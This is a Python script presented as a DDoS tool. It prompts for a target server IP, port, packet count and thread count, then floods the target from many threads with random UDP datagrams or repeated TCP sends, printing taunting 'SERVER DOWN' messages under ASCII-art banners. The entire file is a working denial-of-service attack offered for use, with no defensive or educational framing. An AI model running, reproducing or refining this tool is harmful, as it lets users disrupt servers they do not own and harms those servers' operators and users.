import random
import socket
import threading
import platform
import codecs
import struct
import time
import socket
import sys
import os

print("DDoS is Running in : "+platform.system())

if platform.system() == 'Windows':

	print("""
 Li Zanday is Presenting to you :
 	
▀█░█▀ ▒█░▒█ 　 ▒█░░░ ▒█▄░▒█ ▒█▄░▒█ ▒█▄▀▄█ ▀█▀ ▒█░▒█ 
▒█▀▄░ ▒█░▒█ 　 ▒█░░░ ▒█▒█▒█ ▒█▒█▒█ ▒█▒█▒█ ▒█░ ▒█▀▀█ 
▒█░▒█ ░▀▄▄▀ 　 ▒█▄▄█ ▒█░░▀█ ▒█░░▀█ ▒█░░▒█ ▄█▄ ▒█░▒█  """)
else :
	print("""
	'\033[4;34m'
 Li Zanday is Presenting to you :
 	
▀█░█▀ ▒█░▒█ 　 ▒█░░░ ▒█▄░▒█ ▒█▄░▒█ ▒█▄▀▄█ ▀█▀ ▒█░▒█ 
▒█▀▄░ ▒█░▒█ 　 ▒█░░░ ▒█▒█▒█ ▒█▒█▒█ ▒█▒█▒█ ▒█░ ▒█▀▀█ 
▒█░▒█ ░▀▄▄▀ 　 ▒█▄▄█ ▒█░░▀█ ▒█░░▀█ ▒█░░▒█ ▄█▄ ▒█░▒█

┏━━━┳━━━┓╋╋┏━━━┓
┗┓┏┓┣┓┏┓┃╋╋┃┏━┓┃
╋┃┃┃┃┃┃┃┣━━┫┗━━┓
╋┃┃┃┃┃┃┃┃┏┓┣━━┓┃
┏┛┗┛┣┛┗┛┃┗┛┃┗━┛┃
┗━━━┻━━━┻━━┻━━━┛
┏━━┓┏┓┏┓┏━━┓┏┓┏┓┏━━┓
┃┏┓┃┃┃┃┃┃┏┓┃┃┃┃┃┃┏┓┃
┃┗┛┗┫┃┃┃┃┗┛┗┫┃┃┃┃┗┛┗┓
┃┏━┓┃┃┃┃┃┏━┓┃┃┃┃┃┏━┓┃
┃┗━┛┃┗┛┃┃┗━┛┃┗┛┃┃┗━┛┃
┗━━━┻━━┛┗━━━┻━━┛┗━━━┛
	
	#AUTHOR : KD
        #AUTHOR : youpi
			""")


print("DDos")
ip= str(input("                 Server Ip  :"))
port= int(input("                  Port  :"))
choice = str(input("                 DDoS Attack?? (yes/no)  :"))
times= int(input("                 Paket  :"))
threads= int(input("                  Threads  :"))
fake_ip = '154.121.76.200'
#Starting Attacking
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"LI ZANDAY TA9TA7EM!!!!")
		except:
			print("[!] SERVER DOWN!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[+]","[x]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"LI ZANDAY'' TA9TA7EM!!!!")
		except:
			s.close()
			print("[*] SERVER DOWN")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()